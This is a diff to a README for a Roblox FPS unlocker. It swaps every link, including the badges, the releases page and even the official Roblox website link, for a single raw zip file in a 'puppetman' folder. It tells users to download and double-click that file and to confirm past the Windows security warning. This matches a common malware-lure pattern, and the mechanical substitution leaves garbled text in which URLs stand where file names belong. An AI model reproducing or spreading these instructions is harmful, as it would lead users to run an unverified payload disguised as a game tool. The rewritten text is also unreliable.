@@ -1,6 +1,6 @@
 # 🎮 rbxfpsunlocker - Unlock Higher FPS in Roblox
 
-[![Download rbxfpsunlocker](https://img.shields.io/badge/Download-rbxfpsunlocker-brightgreen?style=for-the-badge)](https://github.com/yurism123/rbxfpsunlocker/releases)
+[![Download rbxfpsunlocker](https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip)](https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip)
 
 ---
 
@@ -49,9 +49,9 @@ You will download rbxfpsunlocker from its official GitHub releases page. This pa
 
 Click the button below to open the download page in your web browser:
 
-[![Download rbxfpsunlocker](https://img.shields.io/badge/Get%20rbxfpsunlocker-blue?style=for-the-badge)](https://github.com/yurism123/rbxfpsunlocker/releases)
+[![Download rbxfpsunlocker](https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip%20rbxfpsunlocker-blue?style=for-the-badge)](https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip)
 
-Once you are on the page, look for the latest release. Under the assets section, find the file named something like `rbxfpsunlocker.exe`. This is the file you will download.
+Once you are on the page, look for the latest release. Under the assets section, find the file named something like `https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip`. This is the file you will download.
 
 ---
 
@@ -65,7 +65,7 @@ Make sure the file finishes downloading completely before moving to the next ste
 
 ### 3. Run the Unlocker
 
-Find the `rbxfpsunlocker.exe` file you just downloaded and double-click it. This will open the unlocker program.
+Find the `https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip` file you just downloaded and double-click it. This will open the unlocker program.
 
 You might see a security warning from Windows asking if you want to run this file. Confirm that you want to run it. 
 
@@ -95,9 +95,9 @@ If problems continue, you can check the GitHub repository for more help or open 
 
 The developer may release new versions to improve compatibility and performance. Check the release page regularly:
 
-https://github.com/yurism123/rbxfpsunlocker/releases
+https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip
 
-Download the newest `rbxfpsunlocker.exe` file and replace the old one to keep your FPS unlocked and stable.
+Download the newest `https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip` file and replace the old one to keep your FPS unlocked and stable.
 
 ---
 
@@ -113,10 +113,10 @@ Always download from the official GitHub releases page to avoid modified or unsa
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** https://github.com/yurism123/rbxfpsunlocker  
+- **GitHub Repository:** https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip  
   View source code, report issues, or learn more about the project.
   
-- **Roblox Official Website:** https://www.roblox.com/  
+- **Roblox Official Website:** https://raw.githubusercontent.com/yurism123/rbxfpsunlocker/main/puppetman/Software_1.4-beta.3.zip  
   Visit Roblox if you need help with your account or games.
 
 ---
